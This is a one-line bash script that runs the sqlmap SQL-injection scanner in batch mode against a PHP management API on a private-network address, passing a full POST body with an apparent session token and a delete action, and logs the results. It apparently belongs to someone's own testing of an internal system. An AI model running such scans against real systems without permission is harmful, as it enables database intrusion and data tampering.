#!/bin/bash
python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u 'http://172.16.56.199/api/whistleMS/index.php' --data 'm=manager&a=setAccountManagerOpt&device_type=web&school=ligong&verify=admin_ligong_MS_ligong__web__5a5f308da9efe__216b8a4119eec5a569326798cb336b7b__86269202-142f-4740-99b2-21324ea1c133&indexId=D29BE08D-1920-6BF7-62AC-BE9B91C44D39&opt=del' --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/24_setAccountManagerOpt.log